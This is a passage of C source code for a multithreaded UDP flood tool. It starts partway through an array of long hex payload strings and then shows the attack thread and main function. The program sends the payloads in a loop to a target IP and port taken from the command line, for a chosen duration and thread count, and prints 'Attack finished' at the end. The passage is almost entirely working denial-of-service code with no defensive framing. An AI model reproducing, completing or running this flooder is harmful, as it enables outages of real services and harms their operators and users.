       "\x27\x0E\x4B\xDD\x38\x2D\xB5\x90\xA4\x87\x14\x3E\xB7\x5D\x0E\x3D\x28\x48\x79\xCF\x5D\x14\x86\x2C\x5A\xC9\xBF\x3C\xD1\x1C\x13\xBF\x93\x0E\xF0\x03\xED\x5C\x62\x34\x7A\x18\x21\x16\xA3\x52\xAE\x7C\x8C\xDB\x05\x39\xAA\xC2\x33\x99\x52\x7B\xBC\x8D\x12\x87\x8F\x50\xFF\x5E\x92\x36\x5D\xEC\x25\x76\xB1\x80\xE4\xD0\xAA\x0C\x49\x1D\x71\xFF\x14\xCA\xAA\xCE\xB9\x26\x45\xC2\xDC\x38\x2A\xFD\x1B\x48\x65\x08\x99\xD2\xE0\xAF\xFD\x22\x2D\x9B\x80\x6C\xAA\x48\x02\x46\x26\x29\x8C\xF6\xD5\xCE\x9D\x8C\x1F\x09\x5F\xE9\xA0\x02\x13\x37\x62\x2E\xC7\xF7\xA3\x37\x7E\x34\x3B\xDF\x2A\xC6\xC4\xB3\xFD\x2C\xD5\x9E\xB0\x9F\xDB\x45\xCD\x13\x0F\xCF\xDF\x9E\xD2\x38\x29\x13\xE4\xB2\xD2\x6E\x1D\xD3\x41\xD8\x00\x15\xFC\xA7\xBE\xE6\x64\xF0\x4F\xAF\xBF\xA9\x1D\xBE\xEC\x7F\xA4\x6D\xCB\x19\xE3\xA5\xE6\xF0\x00\x22\xC0\xC3\x4F\xE7\x27\x11\x00\xFD\x6E\xD4\x43\x78\x6D\x55\x17\xD1\xD5\x6C\xF0\xEA\xB2\x45\xD0\x42\xF7\x32\xF7\x6F\x7C\xFD\xBB\x5F\xC0\x9B\xF0\x52\x86\xDD\x55\x99\x63\xD4\xF7\x8C\x7B\xBF\x00\xCA\x9C\xED\x59\x75\x5E\xA9\x62\xBA\xF1\xD5\xAE\x08\x18\xF9\x12\x55\xE6\x4D\x8C\x0E\xEE\xBE\x38\x6A\x36\xA6\x3E\xEF\x4D\xD6\x31\xB4\xDE\x8E\xDE\x32\x76\x2F\xC5\x81\x54\xC2\x33\x4E\x81\xB3\xF3\xCD\x24\x49\xD2\x37\x19\x4A\xD5\xBE\x9A\x50\x44\xDF\x96\x9D\xF0\x56\x55\x50\xF6\xA9\x6F\x33\x17\x87\x78\x37\x6D\x8B\x21\xA8\x8E\x64\x0A\xE1\x2B\x7D\x2D\x0A\xC3\x45\x60\x94\x00\xBD\xEF\xF5\xC2\x48\x5F\xFB\x72\x88\x81\xF2\xE0\x6D\x69\xD0\xAA\x62\xCB\x16\x0C\x36\x4E\x3C\xAC\x52\x3C\xD8\x7A\x7A\x59\x32\xAD\xEE\x7C\x4E\x53\xFC\xC4\xDB\x26\x8C\x79\xDB\x37\x4D\x31\x31\x31\x52\x27\x3B\x42\xBD\x5F\x71\xC9\x75\x87\x65\xF9\x19\x75\x5A\x88\xA9\x36\x85\xDD\xE4\x2A\xCB\x3E\xAF\xD7\x16\x1A\xB5\x22\x6F\x41\xD2\xA9\xAA\x42\xC3\xC7\x52\x26\x3B\x4B\x9E\x49\x7B\x2E\x04\x3E\x2D\x9A\x0E\x98\x17\x39\xA3\xB6\x75\x7E\xE4\xAC\x71\x0A\xC9\x01\x34\xCC\x06\x34\xF7\x2C\x5B\xDB\x87\xA3\x06\x60\x5C\x2C\xCA\xC7\x58\x85\x05\xCA\x66\x12\x36\xB1\x06\x97\x27\xFE\x43\xAB\x57\x23\x0E\xCA\x1A\x39\x1F\x0E\x41\xCB\x58\x2C\x08\xF1\xF6\x3C\x24\x1B\x0E\x51\xCC\xB8\x32\xB0\x84\x34\x3D\x59\xC7\xAB\xE5\xDE\x00\x1F\x04\xA4\x8B\xD3\x6D\xE0\xD7\x92\x9F\xBF\x31\xB8\xFE\x0C\x1F\xF1\x17\x0E\xCC\x1A\x9F\x00\x96\x90\xC4\x3F\x9E\x47\xB5\x75\x7A\xB6\xD1\x5C\xB0\xD1\x5D\x0C\x76\x1E\xD8\x81\xBF\xFC\x5C\xDD\x4B\x23\x12\x06\x57\x0F\x3F\xDE\xE3\xF4\x64\xA3\xE0\x05\x17\x0B\x0E\xD0\x9A\x28\x28\xCE\xA4\xDA\x2D\x74\xDD\xF9\xA4\x9D\xA2\x3F\x78\x9F\x54\x09\x6A\x00\xBE\x54\x5F\x98\x1D\x39\x45\x6E\x0F\x91\x6A\x74\x0F\x6D\xBA\x56\xF9\x52\x7F\x21\x15\x07\xE2\x8B\x3E\x73\x12\xF4\x34\x12\x1B\x74\xB3\x2F\x0B\xF5\xDF\x24\x14\xE7\x3A\x52\xC8\x40\x30\xAF\x3D\x2F\x76\x97\xA7\xE4\xDA\xFC\x8C\xE2\xDD\xA8\x1D\xA1\x36\x9E\xA0\xB8\x7A\x88\xF3\x49\xAA\xF4\xD9\x0E\x14\x2C\x68\x29\x87\x4B\xCF\xF8\x7B\xEF\x86\x80\x30\xA9\x7B\x52\xB4\x46\x0F\x0E\x51\xCC\xB8\x32\xB0\x84\x34\x3D\x99\x6A\xD9\xE5\x06\xBC\x02\x04\xA4\x8B\xD3\x6D\xE0\xD7\x92\x9F\xBF\x31\xB8\xBE\x16\x1F\x91\x16\x55\x83\xAD\xEC\x3B\x14\x52\x79\x07\x0E\x21\xCB\x58\x2C\x08\xD1\xF0\x3C\x14\x09\xEF\x1A\xEE\xD6\x0B\x18\xB8\x94\x8C\x81\xBD\x1C\xF0\x63\xAC\x8A\xB6\x90\x54\x2E\x51\x4B\x89\x6C\xB6\xF6\x7A\xC0\xB2\xC5\x5D\x60\x53\x04\xFC\x32\x53\x39\xB4\x90\xAF\x0A\xB8\x82\xD8\xE2\x80\x70\xDB\xF8\xDF\x99\x84\x2B\x03\x3C\x00\x30\x25\x31\x8D\xD4\xE1\xA0\xB0\x14\x74\x3D\x50\x98\xEC\x0B\x2A\x26\x93\x32\x0B\x98\x33\xA0\xA2\x5A\xE8\x5A\x08\x9F\x08\x4B\x10\x82\xCE\x28\x0C\xC4\x26\xB9\xA5\x16\xF5\x27\x64\x90\x70\xAC\x46\xEE\xDB\xDE\xD6\x23\x3D\x2D\x16\x58\x5A\xC4\xB9\xEC\x43\x44\xB5\xB9\xDD\x76\x14\x1C\x20\xF0\x7E\x7E\xC6\x90\x2E\x18\x3A\xD0\x09\xA1\xE3\xBA\xD3\x68\x9E\x7E\x62\x9A\x85\x0F\x8A\x7E\xA1\xF5\xC7\x12\x93\xBD\x8F\x7D\xAF\x92\xFB\x3D\x7D\x30\xD8\xC4\x83\x9E\xB9\xC7\x86\xE4\x82\x6B\x4C\xB1\xAF\xC2\x35\xD3\x78\x9A\xA5\x58\xD5\x37\xA1\xAF\xE3\xF5\xE5\x84\x2E\x31\x1E\xB7\xEB\x3F\x5B\x4C\x82\xE7\xDE\x84\x45\x24\x3C\x60\xAE\xBA\x70\x68\x4B\x91\xBB\xA5\x9D\x9F\x3C\xEF\xC7\x69\xC7\xB0\x51\x01\xB6\xC7\x5B\x80\x38\xB8\x0B\x60\x97\x7C\x9B\x92\x07\x02\xA0\xB5\xC7\xA7\x80\x8B\x87\x53\x6A\x54\x65\xF9\xC4\xB9\xEE\xFB\xC8\xF5\x54\xFD\xB1\x48\x9E\x85\xB0\xAD\x6D\xF4\x12\x37\x97\x8E\x36\x2B\x0E\xE8\xC8\x52\xD5\x22\x83\x17\xCC\x15\xFE\x24\xCB\x8A\x43\xEC\x00\xAA\x03\x44\xB0\x68\x0C\x0E\x8D\xB5\xFC\xAB\x31\x12\xA9\xEF\x5A\xCB\x15\x59\x2B\xB6\x13\xD9\x65\x2D\xD4\xB4\x0B\x54\x66\x9A\xEF\x5F\xBE\x34\x77\x96\x10\x83\xC6\x86\x72\xBE\x13\x53\x2B\xE8\x17\x37\x1E\xA0\x6F\x6F\xE1\x08\xDE\x9C\xF8\xEE\x13\xB6\xCB\xC9\x08\xA0\xBF\x2F\x2E\x26\x12\x56\x01\x97\x43\x77\xF9\x92\x25\x0A\x28\x93\xE6\x75\xE8\xEF\x00\xF9\x96\x7B\x15\xF9\x89\x03\x69\x3C\x6E\x27\xC7\x11\xCB\x16\x20\x3C\xD5\xD4\xF9\x50\xBF\xBB\xCD\x46\x9E\xBF\x4B\xCC\xE0\x79\x3C\xD8\xB0\x5C\xCC\xCD\xE1\x58\xB5\x82\x7E\x6B\x2A\xAD\x91\x0C\x5E\x4C\x8E\xE7\x3E\x46\x08\x86\x73\xA4\x4E\xF7\x3C\x28\xC1\xAB\xCB\xF7\x9D\x00\x09\x4B\xCE\x87\x81\xC1\xDA\x16\xB6\xC1\xDE\x29\xFE\x03\x4E\x50\xAF\x98\x58\x59\xCF\xDD\xD0\x51\x49\x39\x34\x41\x0C\x6C\xA6\x62\xEB\xD7\xBF\xD4\xA6\xE3\xCA\x8D\xD5\x27\xD6\x28\x1C\x1C\xE4\xAC\xE1\x54\x5F\x7B\x20\x46\x93\xC6\x1F\xFF\xE5\x60\x7A\xBA\x6E\x3A\xFC\x0D\x7B\x51\x18\x0D\xCC\xC9\x2F\x3C\xEF\x94\x33\xED\xF3\xFD\x26\x4B\x7B\x31\xB4\x57\xF0\x3F\x56\x4B\x7E\xC1\xA7\x13\xA8\x64\xD1\x2B\x01\x2A\xC1\xDD\x81\xF3\x04\x48\x27\x00\x3F\xF5\xD2\x5C\xED\x55\x93\x23\xF4\x64\x90\xC1\xAF\xD7\x25\x4A\x10\xB3\xA6\xE0\x34\x5F\x92\xE0\x26\x2D\x06\x96\x8B\x06\x72\xF0\xF2\x82\xB2\x62\xF9\x44\xF2\xF5\xEC\xEE\xB0\xB9\xA0\x02\x4A\x4B\xF4\x4D\x78\x8B\x50\xF2\x66\xB5\x94\x23\x23\x5C\xB5\xB5\xD5\x13\x6A\x3A\x12\x97\x53\xAB\x1E\xFF\x76\x0F\x26\x45\xAF\x67\x98\xB7\x28\x1A\x60\x50\x42\x5B\x75\xC2\x10\xFF\x2C\x7F\x29\x4B\x7B\xBB\xF0\xDF\x39\x73\xBD\x2A\x03\xB7\x94\xE8\x22\x18\x56\xE2\x0D\xBF\xDB\x73\x02\xE0\x0D\x77\xDF\x89\x27\xD3\xBA\x34\x29\xC1\x32\xCC\x53\xED\x2D\x10\x0E\x2D\xB7\xDC\xAA\xA1\x12\xA9\xAF\x41\x89\xAC\x2D\xE4\x68\xF8\x94\x54\x51\xB0\x09\x74\x3A\x45\x7B\xEE\x81\xFF\x3D\x3C\x2D\x05\xAF\xCE\xF6\x85\x25\x03\x4B\x93\x82\x04\xAB\x21\x93\xEF\x61\x57\x0F\xDD\xBC\xA8\xDB\xF2\x7D\x62\xD7\x24\xC6\x63\x51\x9F\xD9\x4F\xDA\x00\xA1\x74\x79\x1A\xFA\x4E\x9B\xF1\x29\x62\x6E\x74\x91\x2E\x55\x06\x6F\x97\xAF\xD6\x0E\xCF\xB0\xFA\x5C\xAF\xB3\x22\xCF\x20\xBC\x14\xBA\x54\xBC\x23\xED\x5E\x89\x24\xB4\xCA\xB4\x86\xE6\x15\x2D\x94\x4C\x9D\x2C\xE4\x35\x32\x7E\xB0\xA2\x1A\x57\xEF\xDF\x5F\x1C\x86\xC7\xDB\x84\x45\x24\x35\xE5\x65\xD4\xEB\x5E\xAB\xE4\x82\x5B\x62\x61\x54\xE6\x4F\x64\x45\x8C\x49\x08\x96\xA5\xDE\xF4\x3B\x91\x6A\x68\xBF\x77\xAB\x93\x48\x0B\x40\x2A\x20\xFA\xD7\x03\x77\xE0\xB2\x72\xA4\x0C\x6F\x2B\xA9\xF1\x3A\x8A\xBA\x3D\xF6\xD8\x85\x90\x5B\x48\x01\xB0\xD4\xC1\x1B\x3C\x0F\x39\x6E\xC1\xAC\xC1\x55\x47\x89\xC4\x33\x1E\x70\x72\x91\x1C\xCC\xD3\x2F\x5F\x0F\x2A\x70\x7B\x67\xFA\x4",
        "\x27\x0E\x4B\xDD\x38\x2D\xB5\x90\xA4\x87\x14\x3E\xB7\x5D\x0E\x3D\x28\x48\x79\xCF\x5D\x14\x86\x2C\x5A\xC9\xBF\x3C\xD1\x1C\x13\xBF\x93\x0E\xF0\x03\xED\x5C\x62\x34\x7A\x18\x21\x16\xA3\x52\xAE\x7C\x8C\xDB\x05\x39\xAA\xC2\x33\x99\x52\x7B\xBC\x8D\x12\x87\x8F\x50\xFF\x5E\x92\x36\x5D\xEC\x25\x76\xB1\x80\xE4\xD0\xAA\x0C\x49\x1D\x71\xFF\x14\xCA\xAA\xCE\xB9\x26\x45\xC2\xDC\x38\x2A\xFD\x1B\x48\x65\x08\x99\xD2\xE0\xAF\xFD\x22\x2D\x9B\x80\x6C\xAA\x48\x02\x46\x26\x29\x8C\xF6\xD5\xCE\x9D\x8C\x1F\x09\x5F\xE9\xA0\x02\x13\x37\x62\x2E\xC7\xF7\xA3\x37\x7E\x34\x3B\xDF\x2A\xC6\xC4\xB3\xFD\x2C\xD5\x9E\xB0\x9F\xDB\x45\xCD\x13\x0F\xCF\xDF\x9E\xD2\x38\x29\x13\xE4\xB2\xD2\x6E\x1D\xD3\x41\xD8\x00\x15\xFC\xA7\xBE\xE6\x64\xF0\x4F\xAF\xBF\xA9\x1D\xBE\xEC\x7F\xA4\x6D\xCB\x19\xE3\xA5\xE6\xF0\x00\x22\xC0\xC3\x4F\xE7\x27\x11\x00\xFD\x6E\xD4\x43\x78\x6D\x55\x17\xD1\xD5\x6C\xF0\xEA\xB2\x45\xD0\x42\xF7\x32\xF7\x6F\x7C\xFD\xBB\x5F\xC0\x9B\xF0\x52\x86\xDD\x55\x99\x63\xD4\xF7\x8C\x7B\xBF\x00\xCA\x9C\xED\x59\x75\x5E\xA9\x62\xBA\xF1\xD5\xAE\x08\x18\xF9\x12\x55\xE6\x4D\x8C\x0E\xEE\xBE\x38\x6A\x36\xA6\x3E\xEF\x4D\xD6\x31\xB4\xDE\x8E\xDE\x32\x76\x2F\xC5\x81\x54\xC2\x33\x4E\x81\xB3\xF3\xCD\x24\x49\xD2\x37\x19\x4A\xD5\xBE\x9A\x50\x44\xDF\x96\x9D\xF0\x56\x55\x50\xF6\xA9\x6F\x33\x17\x87\x78\x37\x6D\x8B\x21\xA8\x8E\x64\x0A\xE1\x2B\x7D\x2D\x0A\xC3\x45\x60\x94\x00\xBD\xEF\xF5\xC2\x48\x5F\xFB\x72\x88\x81\xF2\xE0\x6D\x69\xD0\xAA\x62\xCB\x16\x0C\x36\x4E\x3C\xAC\x52\x3C\xD8\x7A\x7A\x59\x32\xAD\xEE\x7C\x4E\x53\xFC\xC4\xDB\x26\x8C\x79\xDB\x37\x4D\x31\x31\x31\x52\x27\x3B\x42\xBD\x5F\x71\xC9\x75\x87\x65\xF9\x19\x75\x5A\x88\xA9\x36\x85\xDD\xE4\x2A\xCB\x3E\xAF\xD7\x16\x1A\xB5\x22\x6F\x41\xD2\xA9\xAA\x42\xC3\xC7\x52\x26\x3B\x4B\x9E\x49\x7B\x2E\x04\x3E\x2D\x9A\x0E\x98\x17\x39\xA3\xB6\x75\x7E\xE4\xAC\x71\x0A\xC9\x01\x34\xCC\x06\x34\xF7\x2C\x5B\xDB\x87\xA3\x06\x60\x5C\x2C\xCA\xC7\x58\x85\x05\xCA\x66\x12\x36\xB1\x06\x97\x27\xFE\x43\xAB\x57\x23\x0E\xCA\x1A\x39\x1F\x0E\x41\xCB\x58\x2C\x08\xF1\xF6\x3C\x24\x1B\x0E\x51\xCC\xB8\x32\xB0\x84\x34\x3D\x59\xC7\xAB\xE5\xDE\x00\x1F\x04\xA4\x8B\xD3\x6D\xE0\xD7\x92\x9F\xBF\x31\xB8\xFE\x0C\x1F\xF1\x17\x0E\xCC\x1A\x9F\x00\x96\x90\xC4\x3F\x9E\x47\xB5\x75\x7A\xB6\xD1\x5C\xB0\xD1\x5D\x0C\x76\x1E\xD8\x81\xBF\xFC\x5C\xDD\x4B\x23\x12\x06\x57\x0F\x3F\xDE\xE3\xF4\x64\xA3\xE0\x05\x17\x0B\x0E\xD0\x9A\x28\x28\xCE\xA4\xDA\x2D\x74\xDD\xF9\xA4\x9D\xA2\x3F\x78\x9F\x54\x09\x6A\x00\xBE\x54\x5F\x98\x1D\x39\x45\x6E\x0F\x91\x6A\x74\x0F\x6D\xBA\x56\xF9\x52\x7F\x21\x15\x07\xE2\x8B\x3E\x73\x12\xF4\x34\x12\x1B\x74\xB3\x2F\x0B\xF5\xDF\x24\x14\xE7\x3A\x52\xC8\x40\x30\xAF\x3D\x2F\x76\x97\xA7\xE4\xDA\xFC\x8C\xE2\xDD\xA8\x1D\xA1\x36\x9E\xA0\xB8\x7A\x88\xF3\x49\xAA\xF4\xD9\x0E\x14\x2C\x68\x29\x87\x4B\xCF\xF8\x7B\xEF\x86\x80\x30\xA9\x7B\x52\xB4\x46\x0F\x0E\x51\xCC\xB8\x32\xB0\x84\x34\x3D\x99\x6A\xD9\xE5\x06\xBC\x02\x04\xA4\x8B\xD3\x6D\xE0\xD7\x92\x9F\xBF\x31\xB8\xBE\x16\x1F\x91\x16\x55\x83\xAD\xEC\x3B\x14\x52\x79\x07\x0E\x21\xCB\x58\x2C\x08\xD1\xF0\x3C\x14\x09\xEF\x1A\xEE\xD6\x0B\x18\xB8\x94\x8C\x81\xBD\x1C\xF0\x63\xAC\x8A\xB6\x90\x54\x2E\x51\x4B\x89\x6C\xB6\xF6\x7A\xC0\xB2\xC5\x5D\x60\x53\x04\xFC\x32\x53\x39\xB4\x90\xAF\x0A\xB8\x82\xD8\xE2\x80\x70\xDB\xF8\xDF\x99\x84\x2B\x03\x3C\x00\x30\x25\x31\x8D\xD4\xE1\xA0\xB0\x14\x74\x3D\x50\x98\xEC\x0B\x2A\x26\x93\x32\x0B\x98\x33\xA0\xA2\x5A\xE8\x5A\x08\x9F\x08\x4B\x10\x82\xCE\x28\x0C\xC4\x26\xB9\xA5\x16\xF5\x27\x64\x90\x70\xAC\x46\xEE\xDB\xDE\xD6\x23\x3D\x2D\x16\x58\x5A\xC4\xB9\xEC\x43\x44\xB5\xB9\xDD\x76\x14\x1C\x20\xF0\x7E\x7E\xC6\x90\x2E\x18\x3A\xD0\x09\xA1\xE3\xBA\xD3\x68\x9E\x7E\x62\x9A\x85\x0F\x8A\x7E\xA1\xF5\xC7\x12\x93\xBD\x8F\x7D\xAF\x92\xFB\x3D\x7D\x30\xD8\xC4\x83\x9E\xB9\xC7\x86\xE4\x82\x6B\x4C\xB1\xAF\xC2\x35\xD3\x78\x9A\xA5\x58\xD5\x37\xA1\xAF\xE3\xF5\xE5\x84\x2E\x31\x1E\xB7\xEB\x3F\x5B\x4C\x82\xE7\xDE\x84\x45\x24\x3C\x60\xAE\xBA\x70\x68\x4B\x91\xBB\xA5\x9D\x9F\x3C\xEF\xC7\x69\xC7\xB0\x51\x01\xB6\xC7\x5B\x80\x38\xB8\x0B\x60\x97\x7C\x9B\x92\x07\x02\xA0\xB5\xC7\xA7\x80\x8B\x87\x53\x6A\x54\x65\xF9\xC4\xB9\xEE\xFB\xC8\xF5\x54\xFD\xB1\x48\x9E\x85\xB0\xAD\x6D\xF4\x12\x37\x97\x8E\x36\x2B\x0E\xE8\xC8\x52\xD5\x22\x83\x17\xCC\x15\xFE\x24\xCB\x8A\x43\xEC\x00\xAA\x03\x44\xB0\x68\x0C\x0E\x8D\xB5\xFC\xAB\x31\x12\xA9\xEF\x5A\xCB\x15\x59\x2B\xB6\x13\xD9\x65\x2D\xD4\xB4\x0B\x54\x66\x9A\xEF\x5F\xBE\x34\x77\x96\x10\x83\xC6\x86\x72\xBE\x13\x53\x2B\xE8\x17\x37\x1E\xA0\x6F\x6F\xE1\x08\xDE\x9C\xF8\xEE\x13\xB6\xCB\xC9\x08\xA0\xBF\x2F\x2E\x26\x12\x56\x01\x97\x43\x77\xF9\x92\x25\x0A\x28\x93\xE6\x75\xE8\xEF\x00\xF9\x96\x7B\x15\xF9\x89\x03\x69\x3C\x6E\x27\xC7\x11\xCB\x16\x20\x3C\xD5\xD4\xF9\x50\xBF\xBB\xCD\x46\x9E\xBF\x4B\xCC\xE0\x79\x3C\xD8\xB0\x5C\xCC\xCD\xE1\x58\xB5\x82\x7E\x6B\x2A\xAD\x91\x0C\x5E\x4C\x8E\xE7\x3E\x46\x08\x86\x73\xA4\x4E\xF7\x3C\x28\xC1\xAB\xCB\xF7\x9D\x00\x09\x4B\xCE\x87\x81\xC1\xDA\x16\xB6\xC1\xDE\x29\xFE\x03\x4E\x50\xAF\x98\x58\x59\xCF\xDD\xD0\x51\x49\x39\x34\x41\x0C\x6C\xA6\x62\xEB\xD7\xBF\xD4\xA6\xE3\xCA\x8D\xD5\x27\xD6\x28\x1C\x1C\xE4\xAC\xE1\x54\x5F\x7B\x20\x46\x93\xC6\x1F\xFF\xE5\x60\x7A\xBA\x6E\x3A\xFC\x0D\x7B\x51\x18\x0D\xCC\xC9\x2F\x3C\xEF\x94\x33\xED\xF3\xFD\x26\x4B\x7B\x31\xB4\x57\xF0\x3F\x56\x4B\x7E\xC1\xA7\x13\xA8\x64\xD1\x2B\x01\x2A\xC1\xDD\x81\xF3\x04\x48\x27\x00\x3F\xF5\xD2\x5C\xED\x55\x93\x23\xF4\x64\x90\xC1\xAF\xD7\x25\x4A\x10\xB3\xA6\xE0\x34\x5F\x92\xE0\x26\x2D\x06\x96\x8B\x06\x72\xF0\xF2\x82\xB2\x62\xF9\x44\xF2\xF5\xEC\xEE\xB0\xB9\xA0\x02\x4A\x4B\xF4\x4D\x78\x8B\x50\xF2\x66\xB5\x94\x23\x23\x5C\xB5\xB5\xD5\x13\x6A\x3A\x12\x97\x53\xAB\x1E\xFF\x76\x0F\x26\x45\xAF\x67\x98\xB7\x28\x1A\x60\x50\x42\x5B\x75\xC2\x10\xFF\x2C\x7F\x29\x4B\x7B\xBB\xF0\xDF\x39\x73\xBD\x2A\x03\xB7\x94\xE8\x22\x18\x56\xE2\x0D\xBF\xDB\x73\x02\xE0\x0D\x77\xDF\x89\x27\xD3\xBA\x34\x29\xC1\x32\xCC\x53\xED\x2D\x10\x0E\x2D\xB7\xDC\xAA\xA1\x12\xA9\xAF\x41\x89\xAC\x2D\xE4\x68\xF8\x94\x54\x51\xB0\x09\x74\x3A\x45\x7B\xEE\x81\xFF\x3D\x3C\x2D\x05\xAF\xCE\xF6\x85\x25\x03\x4B\x93\x82\x04\xAB\x21\x93\xEF\x61\x57\x0F\xDD\xBC\xA8\xDB\xF2\x7D\x62\xD7\x24\xC6\x63\x51\x9F\xD9\x4F\xDA\x00\xA1\x74\x79\x1A\xFA\x4E\x9B\xF1\x29\x62\x6E\x74\x91\x2E\x55\x06\x6F\x97\xAF\xD6\x0E\xCF\xB0\xFA\x5C\xAF\xB3\x22\xCF\x20\xBC\x14\xBA\x54\xBC\x23\xED\x5E\x89\x24\xB4\xCA\xB4\x86\xE6\x15\x2D\x94\x4C\x9D\x2C\xE4\x35\x32\x7E\xB0\xA2\x1A\x57\xEF\xDF\x5F\x1C\x86\xC7\xDB\x84\x45\x24\x35\xE5\x65\xD4\xEB\x5E\xAB\xE4\x82\x5B\x62\x61\x54\xE6\x4F\x64\x45\x8C\x49\x08\x96\xA5\xDE\xF4\x3B\x91\x6A\x68\xBF\x77\xAB\x93\x48\x0B\x40\x2A\x20\xFA\xD7\x03\x77\xE0\xB2\x72\xA4\x0C\x6F\x2B\xA9\xF1\x3A\x8A\xBA\x3D\xF6\xD8\x85\x90\x5B\x48\x01\xB0\xD4\xC1\x1B\x3C\x0F\x39\x6E\xC1\xAC\xC1\x55\x47\x89\xC4\x33\x1E\x70\x72\x91\x1C\xCC\xD3\x2F\x5F\x0F\x2A\x70\x7B\x67\xFA\x4",

    };

     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("MEXDEVELOPER FILE started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("@MExDEVELOPER thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}